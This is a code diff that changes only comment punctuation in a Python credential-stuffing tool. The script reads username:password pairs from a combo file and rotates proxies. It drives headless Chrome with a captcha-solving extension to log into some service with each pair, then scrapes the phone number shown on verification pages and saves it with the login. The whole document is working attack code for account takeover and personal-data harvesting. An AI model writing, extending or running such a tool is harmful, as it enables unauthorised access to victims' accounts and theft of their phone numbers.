@@ -16,16 +16,16 @@ api_key = ''
 threads = 1
 
 def update_api_key_in_script(api_key):
-    # Get the absolute path of the current directory
+    # Get the absolute path of the current directory.
     current_dir = os.path.dirname(os.path.abspath(__file__))
     
-    # Create the path of the my_content_script.js file
+    # Create the path of the my_content_script.js file.
     script_file_path = os.path.join(current_dir, 'plugin', 'my-content-script.js')
     
     with open(script_file_path, 'r') as file:
         file_data = file.read()
 
-    # Find the line with the apiKey and replace it
+    # Find the line with the apiKey and replace it.
     file_data = re.sub(r'apiKey:\s*".*?",', f'apiKey: "{api_key}",', file_data)
 
     with open(script_file_path, 'w') as file:
@@ -43,23 +43,23 @@ async def extract_phone_numbers(text):
         return None
 
 def load_settings():
-    # Check if proxy file exists
+    # Check if proxy file exists.
     if not isfile("proxy.txt"):
-        # If not, create one with default settings
+        # If not, create one with default settings.
         with open("proxy.txt", 'w') as proxy_file:
             print(f"{Fore.GREEN}System {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Created proxy file.")
             sys.exit(0)
     
-    # Check if combo file exists
+    # Check if combo file exists.
     if not isfile("combo.txt"):
-        # If not, create one
+        # If not, create one.
         with open("combo.txt", 'w') as combo_file:
             print(f"{Fore.GREEN}System {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.WHITE} Created combo file.")
             sys.exit(0)
-    # Return the settings
+    # Return the settings.
     return
 
-# Function to load proxies from a file
+# Function to load proxies from a file.
 def load_proxies(file_path):
     with open(file_path, 'r') as proxy_file:
         proxies = proxy_file.readlines()
@@ -68,7 +68,7 @@ def load_proxies(file_path):
 def load_combos(file_path):
     with open(file_path, 'r') as file:
         combos = file.readlines()
-    return list(set(combos))  # Remove duplicates by converting to a set, then back to a list
+    return list(set(combos))  # Remove duplicates by converting to a set, then back to a list.
 
 
 def remove_proxy(file_path, proxy):
@@ -98,22 +98,22 @@ if not proxies:
 
 async def main(login):
     try:
-        # Select a proxy that hasn't been used yet
+        # Select a proxy that hasn't been used yet.
         proxy = random.choice([p for p in proxies if p not in used_proxies])
         used_proxies.add(proxy)
         username, password = login.strip().split(':')
 
-        #proxy_parts = proxy.split(':')
-        #formatted_proxy = f'{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'
+        #proxy_parts = proxy.split(':').
+        #formatted_proxy = f'{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'.
 
         options = webdriver.ChromeOptions()
         options.single_proxy = proxy
         options.add_argument('--window-size=1280,720 --window-position=0,0')
         options.headless = True
-        # Get the absolute path of the current directory
+        # Get the absolute path of the current directory.
         current_dir = os.path.dirname(os.path.abspath(__file__))
 
-        # Create the path of the unpacked extension
+        # Create the path of the unpacked extension.
         unpacked_extension_path = os.path.join(current_dir, 'plugin')
 
         options.add_argument('--load-extension={}'.format(unpacked_extension_path))
@@ -264,12 +264,12 @@ async def main(login):
                 phone = await driver.find_element(By.XPATH, '//*[@id="otp-root"]/div/div[3]/article/div/p', timeout=5)
                 number = await extract_phone_numbers(await phone.text)
                 print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.GREEN} Number: " + number + f"{Fore.WHITE}")
-                write_to_file(number, login)  # Call the new function here
+                write_to_file(number, login)  # Call the new function here.
             except Exception as e:
                 try:
                     phone = await driver.find_element(By.XPATH, '//*[@id="tiv-v2-web-poller-root"]/div/div/div/div[2]/div[2]/span[2]', timeout=5)
                     print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.GREEN} Number: " + await phone.text + f"{Fore.WHITE}")
-                    write_to_file(await phone.text, login)  # And here
+                    write_to_file(await phone.text, login)  # And here.
                 except Exception as e2:
                     print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}] {Style.DIM}{Fore.WHITE}|{Style.NORMAL}{Fore.RED} Number not found. {Fore.WHITE}")
                     
